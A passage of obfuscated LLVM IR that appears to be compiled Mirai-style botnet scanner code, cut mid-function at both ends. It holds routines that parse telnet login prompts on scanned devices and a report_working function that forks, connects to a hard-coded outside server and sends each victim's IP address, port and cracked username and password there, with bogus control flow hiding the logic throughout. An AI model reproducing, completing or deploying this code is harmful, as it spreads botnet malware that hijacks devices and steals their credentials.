  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 7
  %86 = load i32, i32* %13, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [256 x i8], [256 x i8]* %85, i64 0, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = icmp eq i32 %90, 36
  br i1 %91, label %117, label %92

; <label>:92:                                     ; preds = %83
  %93 = load i32, i32* @x.79
  %94 = load i32, i32* @y.80
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %92
  %101 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %101, i32 0, i32 7
  %103 = load i32, i32* %13, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds [256 x i8], [256 x i8]* %102, i64 0, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = icmp eq i32 %107, 35
  %109 = load i32, i32* @x.79
  %110 = load i32, i32* @y.80
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %108, label %117, label %120

; <label>:117:                                    ; preds = %originalBBpart226, %83, %74, %originalBBpart222
  %118 = load i32, i32* %13, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %14, align 4
  br label %140

; <label>:120:                                    ; preds = %originalBBpart226
  %121 = load i32, i32* @x.79
  %122 = load i32, i32* @y.80
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %120
  %129 = load i32, i32* @x.79
  %130 = load i32, i32* @y.80
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %137

; <label>:137:                                    ; preds = %originalBBpart230
  %138 = load i32, i32* %13, align 4
  %139 = add nsw i32 %138, -1
  store i32 %139, i32* %13, align 4
  br label %30

; <label>:140:                                    ; preds = %117, %originalBBpart218
  %141 = load i32, i32* %14, align 4
  %142 = icmp eq i32 %141, -1
  br i1 %142, label %143, label %176

; <label>:143:                                    ; preds = %140
  %144 = load i32, i32* @x.79
  %145 = load i32, i32* @y.80
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %143
  call void @table_unlock_val(i8 zeroext 25)
  %152 = call i8* @table_retrieve_val(i32 25, i32* %17)
  store i8* %152, i8** %15, align 8
  %153 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %153, i32 0, i32 7
  %155 = getelementptr inbounds [256 x i8], [256 x i8]* %154, i32 0, i32 0
  %156 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %157 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %156, i32 0, i32 6
  %158 = load i32, i32* %157, align 4
  %159 = load i8*, i8** %15, align 8
  %160 = load i32, i32* %17, align 4
  %161 = sub nsw i32 %160, 1
  %162 = call i32 @util_memsearch(i8* %155, i32 %158, i8* %159, i32 %161)
  %163 = icmp ne i32 %162, -1
  %164 = zext i1 %163 to i32
  store i32 %164, i32* %16, align 4
  %165 = load i32, i32* @x.79
  %166 = load i32, i32* @y.80
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart242, label %originalBB32alteredBB

originalBBpart242:                                ; preds = %originalBB32
  br i1 %163, label %173, label %175

; <label>:173:                                    ; preds = %originalBBpart242
  %174 = load i32, i32* %16, align 4
  store i32 %174, i32* %14, align 4
  br label %175

; <label>:175:                                    ; preds = %173, %originalBBpart242
  br label %176

; <label>:176:                                    ; preds = %175, %140
  call void @table_lock_val(i8 zeroext 25)
  %177 = load i32, i32* %14, align 4
  %178 = icmp eq i32 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %176
  store i32 0, i32* %10, align 4
  br label %182

; <label>:180:                                    ; preds = %176
  %181 = load i32, i32* %14, align 4
  store i32 %181, i32* %10, align 4
  br label %182

; <label>:182:                                    ; preds = %180, %179
  %183 = load i32, i32* %10, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %1
  %184 = alloca i32, align 4
  %185 = alloca %struct.scanner_connection*, align 8
  %186 = alloca i8*, align 8
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  %189 = alloca i8*, align 8
  %190 = alloca i32, align 4
  %191 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %185, align 8
  store i32 -1, i32* %188, align 4
  %192 = load %struct.scanner_connection*, %struct.scanner_connection** %185, align 8
  %193 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %192, i32 0, i32 6
  %194 = load i32, i32* %193, align 4
  %_ = shl i32 %194, 1
  %_1 = sub i32 0, %194
  %gen = add i32 %_1, 1
  %_2 = sub i32 0, %194
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 %194, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 %194, 1
  %gen7 = mul i32 %_6, 1
  %_8 = sub i32 0, %194
  %gen9 = add i32 %_8, 1
  %_10 = sub i32 %194, 1
  %gen11 = mul i32 %_10, 1
  %_12 = sub i32 0, %194
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 0, %194
  %gen15 = add i32 %_14, 1
  %195 = sub nsw i32 %194, 1
  store i32 %195, i32* %187, align 4
  br label %originalBB

originalBB16alteredBB:                            ; preds = %originalBB16, %30
  %196 = load i32, i32* %13, align 4
  %197 = icmp sgt i32 %196, 0
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %49
  %198 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %199 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %198, i32 0, i32 7
  %200 = load i32, i32* %13, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [256 x i8], [256 x i8]* %199, i64 0, i64 %201
  %203 = load i8, i8* %202, align 1
  %204 = sext i8 %203 to i32
  %205 = icmp eq i32 %204, 58
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %92
  %206 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %207 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %206, i32 0, i32 7
  %208 = load i32, i32* %13, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [256 x i8], [256 x i8]* %207, i64 0, i64 %209
  %211 = load i8, i8* %210, align 1
  %212 = sext i8 %211 to i32
  %213 = icmp eq i32 %212, 35
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %120
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %143
  call void @table_unlock_val(i8 zeroext 25)
  %214 = call i8* @table_retrieve_val(i32 25, i32* %17)
  store i8* %214, i8** %15, align 8
  %215 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %216 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %215, i32 0, i32 7
  %217 = getelementptr inbounds [256 x i8], [256 x i8]* %216, i32 0, i32 0
  %218 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %219 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %218, i32 0, i32 6
  %220 = load i32, i32* %219, align 4
  %221 = load i8*, i8** %15, align 8
  %222 = load i32, i32* %17, align 4
  %_33 = sub i32 0, %222
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %222, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %222, 1
  %_38 = sub i32 %222, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %222, 1
  %223 = sub nsw i32 %222, 1
  %224 = call i32 @util_memsearch(i8* %217, i32 %220, i8* %221, i32 %223)
  %225 = icmp ne i32 %224, -1
  %226 = zext i1 %225 to i32
  store i32 %226, i32* %16, align 4
  br label %originalBB32
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_any_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.81
  %3 = load i32, i32* @y.82
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %15 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %16 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %15, i32 0, i32 6
  %17 = load i32, i32* %16, align 4
  %18 = sub nsw i32 %17, 1
  store i32 %18, i32* %13, align 4
  %19 = load i32, i32* @x.81
  %20 = load i32, i32* @y.82
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %79, %originalBBpart2
  %28 = load i32, i32* %13, align 4
  %29 = icmp sgt i32 %28, 0
  br i1 %29, label %30, label %82

; <label>:30:                                     ; preds = %27
  %31 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %32 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %31, i32 0, i32 7
  %33 = load i32, i32* %13, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %32, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 58
  br i1 %38, label %75, label %39

; <label>:39:                                     ; preds = %30
  %40 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %41 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %40, i32 0, i32 7
  %42 = load i32, i32* %13, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds [256 x i8], [256 x i8]* %41, i64 0, i64 %43
  %45 = load i8, i8* %44, align 1
  %46 = sext i8 %45 to i32
  %47 = icmp eq i32 %46, 62
  br i1 %47, label %75, label %48

; <label>:48:                                     ; preds = %39
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 7
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [256 x i8], [256 x i8]* %50, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = icmp eq i32 %55, 36
  br i1 %56, label %75, label %57

; <label>:57:                                     ; preds = %48
  %58 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %59 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %58, i32 0, i32 7
  %60 = load i32, i32* %13, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [256 x i8], [256 x i8]* %59, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp eq i32 %64, 35
  br i1 %65, label %75, label %66

; <label>:66:                                     ; preds = %57
  %67 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %68 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %67, i32 0, i32 7
  %69 = load i32, i32* %13, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %68, i64 0, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 37
  br i1 %74, label %75, label %78

; <label>:75:                                     ; preds = %66, %57, %48, %39, %30
  %76 = load i32, i32* %13, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %82

; <label>:78:                                     ; preds = %66
  br label %79

; <label>:79:                                     ; preds = %78
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, -1
  store i32 %81, i32* %13, align 4
  br label %27

; <label>:82:                                     ; preds = %75, %27
  %83 = load i32, i32* %14, align 4
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  store i32 0, i32* %10, align 4
  br label %104

; <label>:86:                                     ; preds = %82
  %87 = load i32, i32* @x.81
  %88 = load i32, i32* @y.82
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %86
  %95 = load i32, i32* %14, align 4
  store i32 %95, i32* %10, align 4
  %96 = load i32, i32* @x.81
  %97 = load i32, i32* @y.82
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br label %104

; <label>:104:                                    ; preds = %originalBBpart24, %85
  %105 = load i32, i32* %10, align 4
  ret i32 %105

originalBBalteredBB:                              ; preds = %originalBB, %1
  %106 = alloca i32, align 4
  %107 = alloca %struct.scanner_connection*, align 8
  %108 = alloca i8*, align 8
  %109 = alloca i32, align 4
  %110 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %107, align 8
  store i32 -1, i32* %110, align 4
  %111 = load %struct.scanner_connection*, %struct.scanner_connection** %107, align 8
  %112 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %111, i32 0, i32 6
  %113 = load i32, i32* %112, align 4
  %_ = shl i32 %113, 1
  %_1 = shl i32 %113, 1
  %114 = sub nsw i32 %113, 1
  store i32 %114, i32* %109, align 4
  br label %originalBB

originalBB2alteredBB:                             ; preds = %originalBB2, %86
  %115 = load i32, i32* %14, align 4
  store i32 %115, i32* %10, align 4
  br label %originalBB2
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_resp_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  call void @table_unlock_val(i8 zeroext 10)
  %7 = call i8* @table_retrieve_val(i32 10, i32* %6)
  store i8* %7, i8** %4, align 8
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i32, i32* %6, align 4
  %16 = sub nsw i32 %15, 1
  %17 = call i32 @util_memsearch(i8* %10, i32 %13, i8* %14, i32 %16)
  %18 = icmp ne i32 %17, -1
  br i1 %18, label %19, label %36

; <label>:19:                                     ; preds = %1
  %20 = load i32, i32* @x.83
  %21 = load i32, i32* @y.84
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  %28 = load i32, i32* @x.83
  %29 = load i32, i32* @y.84
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %85

; <label>:36:                                     ; preds = %1
  %37 = load i32, i32* @x.83
  %38 = load i32, i32* @y.84
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %36
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %45 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %45, i8** %4, align 8
  %46 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %47 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %46, i32 0, i32 7
  %48 = getelementptr inbounds [256 x i8], [256 x i8]* %47, i32 0, i32 0
  %49 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %50 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %49, i32 0, i32 6
  %51 = load i32, i32* %50, align 4
  %52 = load i8*, i8** %4, align 8
  %53 = load i32, i32* %6, align 4
  %54 = sub nsw i32 %53, 1
  %55 = call i32 @util_memsearch(i8* %48, i32 %51, i8* %52, i32 %54)
  store i32 %55, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %56 = load i32, i32* %5, align 4
  %57 = icmp eq i32 %56, -1
  %58 = load i32, i32* @x.83
  %59 = load i32, i32* @y.84
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart214, label %originalBB1alteredBB

originalBBpart214:                                ; preds = %originalBB1
  br i1 %57, label %66, label %67

; <label>:66:                                     ; preds = %originalBBpart214
  store i32 0, i32* %2, align 4
  br label %85

; <label>:67:                                     ; preds = %originalBBpart214
  %68 = load i32, i32* @x.83
  %69 = load i32, i32* @y.84
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %67
  %76 = load i32, i32* %5, align 4
  store i32 %76, i32* %2, align 4
  %77 = load i32, i32* @x.83
  %78 = load i32, i32* @y.84
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %85

; <label>:85:                                     ; preds = %originalBBpart218, %66, %originalBBpart2
  %86 = load i32, i32* %2, align 4
  ret i32 %86

originalBBalteredBB:                              ; preds = %originalBB, %19
  call void @table_lock_val(i8 zeroext 10)
  store i32 -1, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %36
  call void @table_lock_val(i8 zeroext 10)
  call void @table_unlock_val(i8 zeroext 9)
  %87 = call i8* @table_retrieve_val(i32 9, i32* %6)
  store i8* %87, i8** %4, align 8
  %88 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %89 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %88, i32 0, i32 7
  %90 = getelementptr inbounds [256 x i8], [256 x i8]* %89, i32 0, i32 0
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 6
  %93 = load i32, i32* %92, align 4
  %94 = load i8*, i8** %4, align 8
  %95 = load i32, i32* %6, align 4
  %_ = sub i32 0, %95
  %gen = add i32 %_, 1
  %_2 = sub i32 %95, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %95, 1
  %gen5 = mul i32 %_4, 1
  %_6 = sub i32 0, %95
  %gen7 = add i32 %_6, 1
  %_8 = shl i32 %95, 1
  %_9 = sub i32 %95, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 0, %95
  %gen12 = add i32 %_11, 1
  %96 = sub nsw i32 %95, 1
  %97 = call i32 @util_memsearch(i8* %90, i32 %93, i8* %94, i32 %96)
  store i32 %97, i32* %5, align 4
  call void @table_lock_val(i8 zeroext 9)
  %98 = load i32, i32* %5, align 4
  %99 = icmp eq i32 %98, -1
  br label %originalBB1

originalBB16alteredBB:                            ; preds = %originalBB16, %67
  %100 = load i32, i32* %5, align 4
  store i32 %100, i32* %2, align 4
  br label %originalBB16
}

; Function Attrs: noinline nounwind uwtable
define internal void @report_working(i32, i16 zeroext, %struct.scanner_auth*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i16, align 2
  %6 = alloca %struct.scanner_auth*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca i8, align 1
  store i32 %0, i32* %4, align 4
  store i16 %1, i16* %5, align 2
  store %struct.scanner_auth* %2, %struct.scanner_auth** %6, align 8
  %12 = call i32 @fork() #6
  store i32 %12, i32* %8, align 4
  %13 = load i32, i32* %8, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %18, label %15

; <label>:15:                                     ; preds = %3
  %16 = load i32, i32* %8, align 4
  %17 = icmp eq i32 %16, -1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %15, %3
  ret void

; <label>:19:                                     ; preds = %15
  %20 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %20, i32* %9, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %39

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* @x.85
  %24 = load i32, i32* @y.86
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %22
  call void @exit(i32 0) #8
  %31 = load i32, i32* @x.85
  %32 = load i32, i32* @y.86
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  unreachable

; <label>:39:                                     ; preds = %19
  %40 = load i32, i32* @x.85
  %41 = load i32, i32* @y.86
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  call void @table_unlock_val(i8 zeroext 2)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %48, align 4
  %49 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i32 0, i32 0)) #6
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %51 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %50, i32 0, i32 0
  store i32 %49, i32* %51, align 4
  %52 = call i8* @table_retrieve_val(i32 2, i32* null)
  %53 = bitcast i8* %52 to i16*
  %54 = load i16, i16* %53, align 2
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %54, i16* %55, align 2
  call void @table_lock_val(i8 zeroext 2)
  %56 = load i32, i32* %9, align 4
  %57 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %58 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %58, %struct.sockaddr** %57, align 8
  %59 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %60 = load %struct.sockaddr*, %struct.sockaddr** %59, align 8
  %61 = call i32 @connect(i32 %56, %struct.sockaddr* %60, i32 16)
  %62 = icmp eq i32 %61, -1
  %63 = load i32, i32* @x.85
  %64 = load i32, i32* @y.86
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %71, label %90

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* @x.85
  %73 = load i32, i32* @y.86
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i32, i32* %9, align 4
  %81 = call i32 @close(i32 %80)
  call void @exit(i32 0) #8
  %82 = load i32, i32* @x.85
  %83 = load i32, i32* @y.86
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = load i32, i32* @x.85
  %92 = load i32, i32* @y.86
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  store i8 0, i8* %11, align 1
  %99 = load i32, i32* %9, align 4
  %100 = call i64 @send(i32 %99, i8* %11, i64 1, i32 16384)
  %101 = load i32, i32* %9, align 4
  %102 = bitcast i32* %4 to i8*
  %103 = call i64 @send(i32 %101, i8* %102, i64 4, i32 16384)
  %104 = load i32, i32* %9, align 4
  %105 = bitcast i16* %5 to i8*
  %106 = call i64 @send(i32 %104, i8* %105, i64 2, i32 16384)
  %107 = load i32, i32* %9, align 4
  %108 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %109 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %108, i32 0, i32 4
  %110 = call i64 @send(i32 %107, i8* %109, i64 1, i32 16384)
  %111 = load i32, i32* %9, align 4
  %112 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %113 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %112, i32 0, i32 0
  %114 = load i8*, i8** %113, align 8
  %115 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %116 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %115, i32 0, i32 4
  %117 = load i8, i8* %116, align 4
  %118 = zext i8 %117 to i64
  %119 = call i64 @send(i32 %111, i8* %114, i64 %118, i32 16384)
  %120 = load i32, i32* %9, align 4
  %121 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %122 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %121, i32 0, i32 5
